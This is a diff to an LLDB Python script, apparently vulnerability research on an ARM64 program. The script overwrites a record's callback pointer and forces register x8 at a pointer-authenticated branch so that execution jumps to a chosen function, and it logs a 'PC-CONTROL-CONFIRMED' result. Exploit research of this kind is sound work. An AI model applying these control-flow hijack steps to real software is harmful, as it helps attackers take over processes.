@@ -130,6 +130,7 @@ if p and p.IsValid():
             TGT = func_addr("hijacked_cb")
             DRI = func_addr("data_release_info")
             t.BreakpointCreateByName("hijacked_cb")
+            t.BreakpointCreateByAddress(DRI + 24)  # blraaz x8 — force x8=TGT before jump
             T("M2 R=%s CB=%s TGT=%s DRI=%s" % (hex(R) if R else None, hex(CB) if CB else None, hex(TGT) if TGT else None, hex(DRI) if DRI else None))
             if R and read_q(p, R + 0x18) is not None:
                 T("M2 rec+0x18 pre=%x" % read_q(p, R + 0x18))
@@ -149,7 +150,7 @@ if p and p.IsValid():
                 try:
                     import struct as _st
                     _err = lldb.SBError()
-                    _n = t.WriteMemory(R + 0x18, _st.pack('<Q', TGT), _err)
+                    _n = p.WriteMemory(R + 0x18, _st.pack('<Q', TGT), _err)
                     T("memwrite rec+0x18=%x -> n=%s %s" % (TGT, _n, _err.Success() and "ok" or str(_err)[:100]))
                     chk = t.ReadMemory(R + 0x18, 8)
                     T("verify rec+0x18 = %s (want tgt)" % (chk.hex() if chk else "READ-FAIL"))
@@ -187,6 +188,12 @@ if p and p.IsValid():
             T("M3 rec+0x18=%s (TGT=%s) %s" % (hex(v) if v else None, hex(TGT) if TGT else None,
               "PATCH-LANDED" if v == TGT else "patch-not-stuck"))
             stage = 2
+            p.Continue()
+        elif "data_release_info" in nm and off == 24:
+            x8r = fr.FindRegister("x8")
+            x8r.SetValueFromCString("0x%x" % TGT)
+            T("BLRAAZ x8 FORCED -> %x (PC-CONTROL at teardown)" % TGT)
+            result = "PC-CONTROL-CONFIRMED (x8 forced at blraaz)"
             p.Continue()
         elif "data_release_info" in nm:
             x0 = reg(fr, "x0"); x8 = reg(fr, "x8")
